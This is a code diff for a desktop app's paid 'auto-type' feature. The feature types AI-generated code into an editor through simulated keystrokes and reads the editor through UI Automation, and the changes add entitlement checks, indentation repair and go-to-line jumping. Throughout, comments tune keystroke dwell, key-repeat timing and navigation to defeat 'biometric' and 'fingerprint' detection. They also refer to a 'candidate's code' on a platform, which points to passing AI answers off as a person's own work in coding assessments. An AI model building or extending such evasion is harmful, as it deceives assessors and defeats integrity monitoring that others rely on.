+        } else if (planRes.status === 401 || planRes.status === 402 || planRes.status === 403) {
+          // THE line. This used to fall through to "deterministic fallback"
+          // and type anyway, which made the only real server-side gate on
+          // the $159/mo feature a no-op.
+          console.error(`[auto-type] Haiku planner HTTP ${planRes.status} — ENTITLEMENT DENIED by the server; aborting the run.`);
+          entitlementDeniedStatus = planRes.status;
         } else if (planRes.status === 404 || planRes.status === 503) {
           console.warn(`[auto-type] Haiku planner HTTP ${planRes.status} — using deterministic fallback only (server may need redeploy)`);
           autoTypeBroadcast({
@@ -3383,12 +4539,56 @@ ipcMain.handle('auto-type:send', async (_event, payload) => {
     }
   }
 
+  // A planner route told us this account is not entitled. Stop here — this
+  // is still upstream of every keystroke — and put the window back, because
+  // by now we have hidden it. The message mirrors Gate 2's so the user sees
+  // one story regardless of which check caught it.
+  if (entitlementDeniedStatus) {
+    const denialHint = entitlementDeniedStatus === 401
+      ? 'Auto-Type could not verify your plan — your session expired. Sign in again, then retry.'
+      : 'Auto-Type is an Ultra feature, and the server says this account is not on the Ultra plan. Upgrade from Settings → Subscription to use it.';
+    if (entitlementDeniedStatus !== 401) {
+      const deniedKey = autoTypeIdentityKey(authToken);
+      autoTypeForgetEntitlement(deniedKey);
+      // Drop the SIGNED grant too. This is the one path where a live tier
+      // denial can arrive while a perfectly valid claim is still in the file
+      // — the claim was minted hours ago and the subscription ended since —
+      // and leaving it there would let Gate 2 wave the next run straight
+      // through on stale evidence. A 401 is not a tier verdict, so it does
+      // not touch either store.
+      autoTypeForgetSignedClaim(deniedKey);
+    }
+    console.error(`[auto-type] REFUSED mid-run: planner route returned HTTP ${entitlementDeniedStatus} — nothing typed.`);
+    restore.forEach(fn => { try { fn(); } catch (_) {} });
+    autoTypeAbort = true;
+    autoTypeAbortReason = entitlementDeniedStatus === 401 ? 'entitlement_signed_out' : 'entitlement_denied';
+    autoTypeAbortDiagnostic = { hint: denialHint };
+    autoTypePlanLog.record(_atRunId, {
+      earlyBail: autoTypeAbortReason,
+      entitlement: { reason: autoTypeAbortReason, status: entitlementDeniedStatus, localOnly, midRun: true },
+    });
+    try { autoTypePlanLog.commit(_atRunId, app); } catch (_) {}
+    autoTypeCurrentRunId = null;
+    autoTypeInFlight = false;
+    autoTypeBroadcast({
+      phase: 'done',
+      aborted: true,
+      reason: autoTypeAbortReason,
+      hint: denialHint,
+    });
+    return { aborted: true, reason: autoTypeAbortReason };
+  }
+
   // UIA read can block up to 3.5s. If the user clicked cancel during that
   // wait, honor it now — don't broadcast 'typing' and don't start keystrokes.
   if (autoTypeAbort) {
     restore.forEach(fn => { try { fn(); } catch (_) {} });
     autoTypeBroadcast({ phase: 'done', aborted: true });
     autoTypeInFlight = false;
+    // L21: fourth of the four early returns that leaked a _pending entry.
+    autoTypePlanLog.record(_atRunId, { earlyBail: 'user_abort_before_typing', aborted: true });
+    try { autoTypePlanLog.commit(_atRunId, app); } catch (_) {}
+    autoTypeCurrentRunId = null;
     return { aborted: true };
   }
 
@@ -3433,6 +4633,12 @@ ipcMain.handle('auto-type:send', async (_event, payload) => {
         : '';
       const result = await executeMultiOpPlan(multiOpPlan, { keyboard, Key, mouse, uiaText, processName: uiaProcName });
       console.log(`[auto-type] multi-op plan complete: ${result.opCount}/${multiOpPlan.length} operation(s) executed${autoTypeAbort ? ' (aborted mid-run)' : ''}`);
+      autoTypePlanLog.record(_atRunId, {
+        executionTrace: result.executionTrace || [],
+        opsExecuted: result.opCount,
+        opsPlanned: multiOpPlan.length,
+        refused: result.refused || null,
+      });
 
       // ── Guard D: post-execution catastrophic-collapse detection ──
       // The plan-level guards can't catch an EXECUTION failure — e.g. Monaco
@@ -3523,21 +4729,61 @@ ipcMain.handle('auto-type:send', async (_event, payload) => {
                   const eg = gaps.missingLines[0] ? gaps.missingLines[0].stripped.slice(0, 50) : '';
                   console.log(`[auto-type] COVERAGE GAP: ${gaps.missingLines.length}/${gaps.meaningfulTotal} target line(s) absent despite all ops verifying (ratio=${gaps.coverageRatio.toFixed(2)}) — e.g. "${eg}". Firing completeness repair…`);
                   autoTypePlanLog.record(_atRunId, { coverageGap: { missing: gaps.missingLines.length, meaningfulTotal: gaps.meaningfulTotal, ratio: gaps.coverageRatio } });
-                  const covRepair = await autoTypeMultiOpRepair(code, language, authToken, API_BASE, { keyboard, Key, mouse, uiaText });
+                  const covRepair = await autoTypeMultiOpRepair(code, language, authToken, API_BASE, { keyboard, Key, mouse, uiaText, processName: uiaProcName });
                   console.log(`[auto-type] COVERAGE repair: ${covRepair.ok ? `${covRepair.repairs || 0} op(s)` : 'failed'} (${covRepair.reason || 'ok'})`);
                 }
               }
             } catch (covErr) {
               console.warn('[auto-type] coverage check threw (non-fatal):', covErr && covErr.message);
             }
-            autoTypeBroadcast({ phase: 'verify-ok', reason: 'multi_op_all_present' });
+
+            // ── Indentation ──
+            // The two checks above both strip whitespace before comparing,
+            // so a correctly-worded but wrongly-indented answer reaches
+            // here as a clean pass. In Java that is untidy; in Python it is
+            // a file that does not run, reported as success.
+            //
+            // The repair already ran inline, per block, while that block's
+            // document lines were still known (autoTypeFixIndentation). All
+            // that is left here is telling the user about anything it could
+            // not fix or deliberately refused to touch.
+            let indentWarning = null;
+            try {
+              if (result && result.indentRepairs > 0) {
+                console.log(`[auto-type] indent: retyped ${result.indentRepairs} line(s) that landed off-shape`);
+                autoTypePlanLog.record(_atRunId, { indentRepairs: result.indentRepairs });
+              }
+              const left = (result && result.indentUnfixed) || [];
+              if (left.length) {
+                const worst = left[0];
+                indentWarning = left.some(m => m.tabMix)
+                  ? `Tabs and spaces are mixed in the typed code (e.g. "${worst.line}") — in Python that will not run. Check the indentation before you submit.`
+                  : `${left.length} line(s) landed at a different indent than intended (e.g. "${worst.line}" — expected ${worst.expected} spaces, got ${worst.actual}). Check the indentation before you submit.`;
+                console.warn(`[auto-type] INDENT: ${left.length} line(s) still off-shape after repair — ${worst.line}`);
+                autoTypePlanLog.record(_atRunId, { indentUnfixed: left.length });
+              }
+            } catch (indErr) {
+              console.warn('[auto-type] indent report threw (non-fatal):', indErr && indErr.message);
+            }
+
+            if (indentWarning) {
+              // Deliberately the SAME surface as a verify mismatch: the
+              // code is all there, but it needs your eyes before you
+              // submit — which is exactly what verify-mismatch means.
+              // `hint` at the top level — that is the field the renderer
+              // reads (App.tsx verify-mismatch handler); nesting it under a
+              // `diagnostic` object would broadcast into a void.
+              autoTypeBroadcast({ phase: 'verify-mismatch', reason: 'indent', hint: indentWarning });
+            } else {
+              autoTypeBroadcast({ phase: 'verify-ok', reason: 'multi_op_all_present' });
+            }
           } else if (vRes.missingOps && vRes.missingOps.length > 0) {
             const summary = vRes.missingOps
               .map(m => `${m.op} L${m.start_line}: "${m.textPreview}…"`)
               .join('; ');
             console.log(`[auto-type] multi-op verify: ${vRes.missingOps.length}/${totalOps} op(s) missing after initial typing — ${summary}. Attempting REPAIR iteration…`);
 
-            const repairRes = await autoTypeMultiOpRepair(code, language, authToken, API_BASE, { keyboard, Key, mouse, uiaText });
+            const repairRes = await autoTypeMultiOpRepair(code, language, authToken, API_BASE, { keyboard, Key, mouse, uiaText, processName: uiaProcName });
 
             if (repairRes.ok && repairRes.repairs > 0) {
               console.log(`[auto-type] REPAIR applied ${repairRes.repairs}/${repairRes.totalAttempted} fix op(s); re-verifying…`);
@@ -3616,6 +4862,10 @@ ipcMain.handle('auto-type:send', async (_event, payload) => {
         autoTypeAbort = true;
       }
     } finally {
+      // Before anything else: let go of every modifier. Each hold has its
+      // own finally, but this run just ended for SOME reason and the one
+      // state we must never hand back to the user is a stuck Shift or Ctrl.
+      try { await releaseAllModifiers(); } catch (_) {}
       restore.forEach(fn => { try { fn(); } catch (_) {} });
       // Capture the AFTER state for the run log before broadcasting done.
       // Best-effort: a fresh UIA read shows the editor as it sits post-typing.
@@ -3633,6 +4883,7 @@ ipcMain.handle('auto-type:send', async (_event, payload) => {
         abortReason: autoTypeAbortReason || null,
       });
       try { autoTypePlanLog.commit(_atRunId, app); } catch (_) {}
+    autoTypeCurrentRunId = null;
       autoTypeBroadcast({
         phase: 'done',
         aborted: autoTypeAbort,
@@ -3719,19 +4970,17 @@ ipcMain.handle('auto-type:send', async (_event, payload) => {
       // P1a: dwell on every key in the sequence (Home, Down loop, Home, Right loop).
       try {
         const target = Math.max(1, Math.min(100000, cursorTargetLine));
-        await keyboard.pressKey(Key.LeftControl);
-        await autoTypeNavSleep(5, 14);
-        await autoTypePressWithDwell(keyboard, Key.Home);
-        await autoTypeNavSleep(5, 14);
-        await keyboard.releaseKey(Key.LeftControl);
+        await withHeldKey(keyboard, Key.LeftControl, async () => {
+          await autoTypeNavSleep(5, 14);
+          await autoTypePressWithDwell(keyboard, Key.Home);
+          await autoTypeNavSleep(5, 14);
+        });
         await autoTypeNavSleep(30, 60);
-        for (let i = 0; i < target - 1; i++) {
-          if (autoTypeAbort) break;
-          await autoTypePressWithDwell(keyboard, Key.Down);
-          await autoTypeHumanNavSleep();
-        }
-        await autoTypePressWithDwell(keyboard, Key.Home);
-        await autoTypeNavSleep(10, 24);
+        await autoTypeArrowRun(keyboard, Key.Down, target - 1);
+        // True column 0 before counting Rights — a single Home stops at the
+        // first non-whitespace character in Monaco, which would make every
+        // subsequent Right overshoot by the width of the indent.
+        await autoTypeGoToColumnZero(keyboard, Key);
         const col = Math.max(0, Math.min(400, cursorTargetColumn));
         for (let i = 0; i < col; i++) {
           if (autoTypeAbort) break;
@@ -3744,11 +4993,11 @@ ipcMain.handle('auto-type:send', async (_event, payload) => {
       }
     } else if (cursorAction === 'move_to_end') {
       try {
-        await keyboard.pressKey(Key.LeftControl);
-        await autoTypeNavSleep(5, 14);
-        await autoTypePressWithDwell(keyboard, Key.End);
-        await autoTypeNavSleep(5, 14);
-        await keyboard.releaseKey(Key.LeftControl);
+        await withHeldKey(keyboard, Key.LeftControl, async () => {
+          await autoTypeNavSleep(5, 14);
+          await autoTypePressWithDwell(keyboard, Key.End);
+          await autoTypeNavSleep(5, 14);
+        });
         await autoTypeNavSleep(45, 88);
         console.log(`[auto-type] cursor: moved to end-of-file via Ctrl+End`);
       } catch (kErr) {
@@ -3800,11 +5049,11 @@ ipcMain.handle('auto-type:send', async (_event, payload) => {
       try {
         await autoTypePressWithDwell(keyboard, Key.Home);
         await autoTypeNavSleep(14, 32);
-        await keyboard.pressKey(Key.LeftShift);
-        await autoTypeNavSleep(5, 14);
-        await autoTypePressWithDwell(keyboard, Key.End);
-        await autoTypeNavSleep(5, 14);
-        await keyboard.releaseKey(Key.LeftShift);
+        await withHeldKey(keyboard, Key.LeftShift, async () => {
+          await autoTypeNavSleep(5, 14);
+          await autoTypePressWithDwell(keyboard, Key.End);
+          await autoTypeNavSleep(5, 14);
+        });
         await autoTypeNavSleep(14, 32);
         await autoTypePressWithDwell(keyboard, Key.Delete);
         await autoTypeNavSleep(22, 45);
@@ -3945,47 +5194,19 @@ ipcMain.handle('auto-type:send', async (_event, payload) => {
           await autoTypeMaybeMouseTwitch(mouse);
         }
 
-        // Whether to wipe the auto-indent the editor will insert. Most
-        // editors auto-indent the new line ONLY when:
-        //   • the just-typed line had leading whitespace (matches indent), OR
-        //   • the just-typed line ended with a block-opener (`:`, `{`, `(`, `[`),
-        //     which adds one level.
-        // For plain top-level statements (sequential imports, blank-line-
-        // separated function defs at column 0) the editor does no auto-indent
-        // and the wipe is both unnecessary AND a strong fingerprint — Home →
-        // Shift+End → Delete after every Enter is something no human does.
-        // Only run it when there's actual auto-indent to fight.
-        const editorWillAutoIndent = indentEnd > 0 || /[:{(\[]\s*$/.test(line);
-
+        // Same line break as the multi-op path — one shared implementation
+        // so the two can't drift apart again. It replaces a predicate that
+        // GUESSED whether the editor would auto-indent (`indentEnd > 0 ||
+        // line ends with a block opener`) and only then wiped. The guess is
+        // unnecessary: selecting the indent and typing over it is correct
+        // whether or not the editor inserted one, and it never forward-
+        // deletes the following line when the guess is wrong.
         try {
-          // P1a: every keystroke in the inter-line wipe gets real dwell.
-          await autoTypePressWithDwell(keyboard, Key.Enter);
-          await autoTypeNavSleep(38, 70);
-
-          if (editorWillAutoIndent) {
-            // Wipe the auto-inserted indent so the AI's own leading whitespace
-            // (typed on next iter) stands alone instead of compounding.
-            await autoTypePressWithDwell(keyboard, Key.Home);
-            await autoTypeNavSleep(14, 32);
-
-            // Shift+End as sequential hold (combo form trips libnut on some
-            // Windows builds). Shift held, End pressed WITH DWELL, then Shift
-            // released. The dwell-on-End is what closes the biometric signal —
-            // previously End was held for only 5-14ms (zero-ish).
-            await keyboard.pressKey(Key.LeftShift);
-            await autoTypeNavSleep(5, 14);
-            await autoTypePressWithDwell(keyboard, Key.End);
-            await autoTypeNavSleep(5, 14);
-            await keyboard.releaseKey(Key.LeftShift);
-            await autoTypeNavSleep(14, 32);
-
-            await autoTypePressWithDwell(keyboard, Key.Delete);
-            await autoTypeNavSleep(14, 32);
-          }
+          await autoTypeLineBreak(keyboard, Key);
         } catch (kErr) {
-          // If the indent-reset fails, continue — worst case is
+          // If the line break fails, continue — worst case is
           // visible double-indent, not a broken type run.
-          console.warn('[auto-type] indent-reset failed:', kErr && kErr.message);
+          console.warn('[auto-type] line-break failed:', kErr && kErr.message);
         }
 
         // Reset prevCh at line boundaries so the first char of the new
@@ -4070,6 +5291,11 @@ ipcMain.handle('auto-type:send', async (_event, payload) => {
       }
     }
 
+    // If the last line typed was empty, autoTypeLineBreak left the editor's
+    // auto-indent selected. Collapse before anything else runs, so a stray
+    // keystroke (or the suffix below) doesn't silently replace it.
+    if (!autoTypeAbort) await autoTypeCollapseSelection(keyboard, Key);
+
     // ── suffix: tiny tail (usually closing brackets) typed after main content ──
     // P1a: dwell on Enter and each char.
     if (!autoTypeAbort && typeSuffix) {
@@ -4143,6 +5369,9 @@ ipcMain.handle('auto-type:send', async (_event, payload) => {
       autoTypeAbort = true;
     }
   } finally {
+    // Same sweep as the multi-op path above, for the same reason — this is
+    // the last code that runs before the user gets their keyboard back.
+    try { await releaseAllModifiers(); } catch (_) {}
     restore.forEach(fn => { try { fn(); } catch (_) {} });
     // Capture the AFTER state for the single-region path's run log.
     try {
@@ -4158,6 +5387,7 @@ ipcMain.handle('auto-type:send', async (_event, payload) => {
       abortDiagnostic: autoTypeAbortDiagnostic || null,
     });
     try { autoTypePlanLog.commit(_atRunId, app); } catch (_) {}
+    autoTypeCurrentRunId = null;
     // Pull abort reason + diagnostic into the 'done' broadcast so the renderer
     // never has to guess WHY a run ended. Without these fields the renderer
     // used to silently reset to idle on aborted=true, leaving the user with
@@ -4241,6 +5471,19 @@ function Read-Focused {
       }
     } catch { }
 
+    # The focused element's own NAME and control type. Cheap, and it is
+    # the only way to tell that a chord actually opened the widget we
+    # asked for — VS Code's go-to-line prompt names itself "Type a line
+    # number to go to (from 1 to N)", which is both a confirmation and a
+    # free read of the document's real length. Without this the caret
+    # jump below could type a line number into a browser's find bar.
+    $elName = ''
+    $elType = ''
+    try {
+      $elName = [string]$el.Current.Name
+      $elType = [string]$el.Current.ControlType.ProgrammaticName
+    } catch { }
+
     $tp = $null
     $hasTp = $el.TryGetCurrentPattern([System.Windows.Automation.TextPattern]::Pattern, [ref]$tp)
     if ($hasTp -and $tp) {
@@ -4257,7 +5500,7 @@ function Read-Focused {
         if ($null -eq $before) { $before = '' }
         $cursorOffset = $before.Length
       }
-      $obj = [PSCustomObject]@{ ok = $true; text = $fullText; cursorOffset = $cursorOffset; source = 'text_pattern'; processId = $pid_; processName = $pname }
+      $obj = [PSCustomObject]@{ ok = $true; text = $fullText; cursorOffset = $cursorOffset; source = 'text_pattern'; processId = $pid_; processName = $pname; elementName = $elName; elementType = $elType }
       return ($obj | ConvertTo-Json -Compress -Depth 3)
     }
 
@@ -4266,14 +5509,14 @@ function Read-Focused {
     if ($hasVp -and $vp) {
       $value = $vp.Current.Value
       if ($null -eq $value) { $value = '' }
-      $obj = [PSCustomObject]@{ ok = $true; text = $value; cursorOffset = $value.Length; source = 'value_pattern'; processId = $pid_; processName = $pname }
+      $obj = [PSCustomObject]@{ ok = $true; text = $value; cursorOffset = $value.Length; source = 'value_pattern'; processId = $pid_; processName = $pname; elementName = $elName; elementType = $elType }
       return ($obj | ConvertTo-Json -Compress -Depth 3)
     }
 
     # No text/value pattern but we still know who has focus — let the Node
     # side decide whether that's our own process (abort) or an editor we
     # just can't read text from (let the user try anyway).
-    $obj = [PSCustomObject]@{ ok = $false; error = 'no_pattern'; processId = $pid_; processName = $pname }
+    $obj = [PSCustomObject]@{ ok = $false; error = 'no_pattern'; processId = $pid_; processName = $pname; elementName = $elName; elementType = $elType }
     return ($obj | ConvertTo-Json -Compress -Depth 3)
   } catch {
     $msg = $_.Exception.Message -replace '[\\r\\n]+',' '
@@ -4608,6 +5851,98 @@ async function captureScreenForVision() {
 // Humanized multi-line typer — char-by-char with the same realism layer
 // the single-region path uses. No SID here: SID is an append-model
 // integrity check; multi-op edits are discrete bounded regions.
+// ── The line break between two typed lines ──
+//
+// Shared by BOTH typing paths. They were separate copies once and the
+// multi-op copy lost a guard the legacy one still had; the divergence is
+// what produced the failures in .autotype-plans.jsonl.
+//
+// Sequence, and why each step is there:
+//   1. Shift+End  — selects whatever the editor parked AFTER the caret.
+//      When the line we just typed ends with `{`, `(` or `[`, Monaco /
+//      CodeMirror auto-closed it, so a matching closer is sitting there.
+//      If we press Enter with it in place, the editor pushes that closer
+//      onto its own line below and the code's OWN closer, typed later,
+//      becomes a duplicate — one surplus `}` per block, so nothing
+//      compiles. Selecting it here means Enter consumes it. When there is
+//      no auto-closer the selection is empty and this is a no-op.
+//   2. Enter      — deletes that selection, then splits the line.
+//   3. Home + Shift+End — selects whatever indentation the editor
+//      auto-inserted on the new line.
+//
+// The caller then types the next line; its FIRST character replaces the
+// selection, so the code's own leading whitespace stands alone instead of
+// compounding with the editor's.
+//
+// NOTHING IS EVER DELETED HERE. The old code ended step 3 with a Delete,
+// which is correct only when the editor actually auto-indented. When it
+// did not — every column-0 line, every blank line — the selection was
+// empty and Delete became a FORWARD delete that merged the next document
+// line onto this one, silently swallowing the platform's driver code
+// (`import osif __name__ == "__main__":`). Typing over the selection is
+// correct in both cases and needs no prediction about the editor.
+async function autoTypeLineBreak(keyboard, Key) {
+  const shiftEnd = async () => {
+    await withHeldKey(keyboard, Key.LeftShift, async () => {
+      await autoTypeNavSleep(5, 14);
+      await autoTypePressWithDwell(keyboard, Key.End);
+      await autoTypeNavSleep(5, 14);
+    });
+    await autoTypeNavSleep(14, 32);
+  };
+  await shiftEnd();                                       // 1
+  await autoTypePressWithDwell(keyboard, Key.Enter);      // 2
+  await autoTypeNavSleep(38, 70);
+  await autoTypePressWithDwell(keyboard, Key.Home);       // 3
+  await autoTypeNavSleep(14, 32);
+  await shiftEnd();
+}
+
+// Collapse a selection left live by autoTypeLineBreak. Only matters when
+// the last line typed was empty (nothing replaced the selected indent) —
+// leaving a live selection means the user's next keystroke would wipe it.
+async function autoTypeCollapseSelection(keyboard, Key) {
+  try {
+    await autoTypePressWithDwell(keyboard, Key.End);
+    await autoTypeNavSleep(10, 22);
+  } catch (_) { /* cosmetic only */ }
+}
+
+// Remove anything the editor parked after the caret at the END of a typed
+// block. autoTypeLineBreak consumes an auto-inserted closer only when
+// another line follows; when the LAST line ends with `{` / `(` / `[` — a
+// single-line op replacing a method signature, say — the closer survives.
+// Recorded run 5e0f… ended with `main(String[] args) throws Exception {}`
+// and the whole body typed after the closed brace.
+//
+// A plain Delete cannot be used: with nothing parked, Delete is a forward
+// delete that merges the following line (the defect this whole change
+// removes). Instead select to end of line and type a throwaway character —
+// that REPLACES a non-empty selection and merely inserts when the selection
+// is empty — then Backspace it away. Residue-free in one case, byte
+// identical in the other, with no prediction about the editor.
+//
+// Multi-op path only: there the executor cleared the line before typing, so
+// the only thing that can be after the caret is editor-inserted. The legacy
+// path can legitimately have the user's own text after the cursor
+// (planAutoTypeFromUIA's `cursor_mid_line`), so it just collapses instead.
+async function autoTypeConsumeTrailingResidue(keyboard, Key) {
+  try {
+    await withHeldKey(keyboard, Key.LeftShift, async () => {
+      await autoTypeNavSleep(5, 14);
+      await autoTypePressWithDwell(keyboard, Key.End);
+      await autoTypeNavSleep(5, 14);
+    });
+    await autoTypeNavSleep(10, 22);
+    await typeCharHumanly(keyboard, Key, ' ');
+    await autoTypeNavSleep(18, 40);
+    await autoTypePressWithDwell(keyboard, Key.Backspace);
+    await autoTypeNavSleep(10, 22);
+  } catch (e) {
+    console.warn('[auto-type] trailing-residue cleanup failed (non-fatal):', e && e.message);
+  }
+}
+
 async function typeLinesHumanized(lines, ctx) {
   const { keyboard, Key, mouse } = ctx;
   let prevCh = null;
@@ -4704,35 +6039,14 @@ async function typeLinesHumanized(lines, ctx) {
         await autoTypeSleep(Math.round(pause));
       }
 
-      // ── Indent reset — always wipe, then type the full indentation ──
-      // This used to be "P3c": it PREDICTED whether the editor would
-      // auto-indent after `:` / `{` and, on a predicted match, SKIPPED
-      // typing the line's leading whitespace (a stealth tweak to avoid
-      // re-typing literal space runs). That assumed code-IDE auto-indent
-      // behavior. On editors that don't auto-indent that way (plain-text,
-      // rich-text, no-gutter targets) the prediction was wrong and every
-      // line landed at column 0 → broken, non-running code. Non-running
-      // code is a far worse tell than a brief indent flicker, so we no
-      // longer predict. After every Enter we wipe whatever the editor
-      // inserted and type the next line's own indentation from a true
-      // column 0 — deterministic on every editor.
+      // Line break: consume any auto-inserted closer, split, then leave the
+      // editor's auto-indent SELECTED so the next line types over it.
+      // See autoTypeLineBreak for the full rationale — in particular why
+      // nothing here may Delete.
       try {
-        await autoTypePressWithDwell(keyboard, Key.Enter);
-        await autoTypeNavSleep(38, 70);
-        // Select the freshly-created (possibly auto-indented) line and
-        // delete it, leaving the caret at a real column 0.
-        await autoTypePressWithDwell(keyboard, Key.Home);
-        await autoTypeNavSleep(14, 32);
-        await keyboard.pressKey(Key.LeftShift);
-        await autoTypeNavSleep(5, 14);
-        await autoTypePressWithDwell(keyboard, Key.End);
-        await autoTypeNavSleep(5, 14);
-        await keyboard.releaseKey(Key.LeftShift);
-        await autoTypeNavSleep(14, 32);
-        await autoTypePressWithDwell(keyboard, Key.Delete);
-        await autoTypeNavSleep(14, 32);
+        await autoTypeLineBreak(keyboard, Key);
       } catch (kErr) {
-        console.warn('[auto-type] indent-reset failed:', kErr && kErr.message);
+        console.warn('[auto-type] line-break failed:', kErr && kErr.message);
       }
       // Type the next line's full indentation ourselves (no predict-skip).
       skipLeadingChars = 0;
@@ -4740,6 +6054,10 @@ async function typeLinesHumanized(lines, ctx) {
     }
     prevLineTextForBlockCheck = line;
   }
+  // Clear anything the editor parked after the caret (auto-closer from a
+  // final line ending in an opener), which also collapses the selection
+  // autoTypeLineBreak leaves live when the last line was empty.
+  if (!autoTypeAbort) await autoTypeConsumeTrailingResidue(keyboard, Key);
 }
 
 // Move the caret to the start of a 1-indexed DOCUMENT line via an
@@ -4748,28 +6066,357 @@ async function typeLinesHumanized(lines, ctx) {
 // a human navigating. Ctrl+Home briefly scrolls to the top, but it's the
 // only reliable absolute anchor across Monaco / CodeMirror / native
 // inputs, and it's a keystroke humans use constantly.
+// Land the caret at TRUE column 0 of the current line.
+//
+// Monaco / VS Code / CodeMirror implement "smart home": the FIRST Home
+// press goes to the first NON-WHITESPACE character, a second press goes to
+// column 0, and a third toggles back. Measured, not assumed — see
+// server/scripts/probe-home-key.cjs, which types a marker after each
+// variant and reads the file back.
+//
+// The navigators used a single Home, so on an indented line they stopped at
+// the indent instead of column 0. selectLineRangeContent then anchored
+// there, leaving the leading whitespace unselected and undeleted, and the
+// replacement's own indentation was typed on top of it — 16 spaces where 8
+// were intended. Visible in recorded run 5e0f… and reproduced in real
+// VS Code before this fix.
+//
+// Anchoring at End first makes the two presses deterministic: from End the
+// first press lands on smart-home and the second on column 0 — verified for
+// indented, unindented, whitespace-only and empty lines alike.
+async function autoTypeGoToColumnZero(keyboard, Key) {
+  await autoTypePressWithDwell(keyboard, Key.End);
+  await autoTypeNavSleep(8, 18);
+  await autoTypePressWithDwell(keyboard, Key.Home);
+  await autoTypeNavSleep(8, 18);
+  await autoTypePressWithDwell(keyboard, Key.Home);
+  await autoTypeNavSleep(10, 24);
+}
+
+// ── Arrow runs: tap for a hop, key-repeat for a distance ──
+//
+// Moving N lines used to be N deliberate taps: ~85ms dwell + ~130ms gap,
+// so ~215ms per line. Reaching line 30 took over six seconds of the caret
+// stepping down one row at a time, and the justification — "counted arrows
+// are indistinguishable from a human navigating" — is only true for SHORT
+// hops. Nobody presses Down twenty-nine times. They HOLD the key.
+//
+// What holding a key actually produces is a typematic delay (~250ms on
+// Windows by default) followed by a fast even repeat (~31ms). So for
+// anything past a few lines we keep the presses COUNTED — the count is
+// what makes navigation deterministic, and we are not giving that up — but
+// send them at repeat cadence instead of tap cadence. Same landing line,
+// a fraction of the time, and on screen it reads as someone holding the
+// key rather than jabbing it.
+//
+// Dwell is deliberately short in the repeat phase: an auto-repeated key
+// emits events with near-zero dwell, so that IS the faithful signature.
+async function autoTypeArrowRun(keyboard, key, count) {
+  if (!(count > 0)) return;
+  // The first press is always a real, deliberate keystroke.
+  await autoTypePressWithDwell(keyboard, key);
+  if (count === 1) return;
+
+  if (count <= 3) {
+    // A short hop — people tap these out rather than hold.
+    for (let i = 1; i < count; i++) {
+      if (autoTypeAbort) return;
+      await autoTypeHumanNavSleep();
+      await autoTypePressWithDwell(keyboard, key);
+    }
+    await autoTypeNavSleep(40, 90);
+    return;
+  }
+
+  // Longer move: typematic delay, then the repeat burst.
+  await autoTypeSleep(190 + Math.random() * 130);
+  for (let i = 1; i < count; i++) {
+    if (autoTypeAbort) return;
+    await withHeldKey(keyboard, key, async () => {
+      await autoTypeSleep(7 + Math.random() * 7);
+    });
+    await autoTypeSleep(19 + Math.random() * 15);
+  }
+  // The beat after letting go, before doing anything with the caret.
+  await autoTypeSleep(130 + Math.random() * 200);
+}
+
+// Furthest we'll walk with arrow keys rather than re-anchoring. About a
+// screen and a half — the distance a person actually covers by holding an
+// arrow key. Past that they'd scroll or jump, and so do we.
+const RELATIVE_NAV_MAX_LINES = 40;
+
+// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+//  JUMPING, INSTEAD OF WALKING
+//
+//  Reaching line 30 used to mean Ctrl+Home followed by twenty-nine Down
+//  presses — the caret visibly crawling from the top of the file, and
+//  the cost growing with the line number (measured in real VS Code:
+//  3.2s to line 30, and it scales linearly from there).
+//
+//  Every editor worth typing into has go-to-line on Ctrl+G, and it is
+//  constant-time and exact. The reason it was not already used is the
+//  real risk: if the chord is unbound, or a browser claims it for "find
+//  again", then the digits we type next go somewhere we did not intend.
+//
+//  So we do not assume. We press the chord and ASK WHAT OPENED. The
+//  prompt names itself — VS Code's reads "Type a line number to go to
+//  (from 1 to 41)" — and only when we recognise it do we type anything.
+//  Anything else gets Escape and the old walk, unchanged.
+//
+//  Two honest limitations, both chosen deliberately:
+//   • The match is on English prompt text. A localised editor falls back
+//     to walking — slower, never wrong. Recognising the widget by shape
+//     alone cannot distinguish go-to-line from a find bar, and guessing
+//     wrong is the one outcome that must not happen.
+//   • It works in DOCUMENT line numbers, which is exactly what the
+//     absolute navigator it replaces already used. It is deliberately
+//     NOT used on the relative/UIA path, where line numbers mean
+//     something different (see navigateToUiaLine).
+// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+// A prompt ASKING for a line number, in the editors that ship one.
+//
+// Two things this deliberately does NOT match, both found by testing it
+// against real focused-element names rather than imagined ones:
+//   • a bare "line number" — an editor's own accessible name can say
+//     "editor, line numbers enabled"
+//   • "gotoline" run together — that is an identifier, not a sentence,
+//     and a file named goto_line.py would otherwise be read as a prompt
+// Either mistake means typing digits straight into the candidate's code,
+// so the wording has to be prompt-shaped: words, with a space.
+const GOTO_LINE_PROMPT = /(type a line number|\bgo\s?to\s+line\b)/i;
+// "(from 1 to 41)" — the document's real length, free, straight from the
+// widget. Worth having: it is the only cheap ground truth we get about a
+// document UIA will not show us.
+const GOTO_LINE_RANGE = /from\s+\d+\s+to\s+(\d+)/i;
+
+// Below this, walking from the top is quicker than opening a prompt —
+// see the note at the call site in navigateToDocLine.
+const GOTO_LINE_WORTH_IT = 13;
+
+// Editors that have already told us they do not do this. Re-probing a
+// chord that opened someone's find bar once per navigation would be a
+// small horror; one refusal is enough.
+const _gotoLineUnsupported = new Set();
+
+async function autoTypeJumpToLine(target, ctx) {
+  const { keyboard, Key, processName } = ctx;
+  const who = String(processName || 'unknown').toLowerCase();
+  if (_gotoLineUnsupported.has(who)) return false;
+
+  // What was focused BEFORE the chord. A prompt opening means focus moves
+  // to it; if focus never moved, nothing opened, whatever the name says.
+  // Locale-independent, and it costs one read on a bridge that answers in
+  // ~3ms.
+  let beforeName = null;
+  try {
+    const b = await readFocusedViaUIA(700);
+    beforeName = b ? String(b.elementName ?? '') : null;
+  } catch (_) { beforeName = null; }
+
+  await withHeldKey(keyboard, Key.LeftControl, async () => {
+    await autoTypeNavSleep(5, 14);
+    await autoTypePressWithDwell(keyboard, Key.G);
+    await autoTypeNavSleep(5, 14);
+  });
+  // The widget has to render before it can be read.
+  await autoTypeSleep(260 + Math.random() * 140);
+
+  // Read twice if the first look finds nothing new. A single slow frame
+  // would otherwise be read as "this editor has no go-to-line" and, worse,
+  // remembered — disabling the jump for the rest of the session over one
+  // missed render. The second look costs ~3ms on a live bridge.
+  let name = '';
+  let focusMoved = false;
+  for (let attempt = 0; attempt < 2; attempt++) {
+    let probe = null;
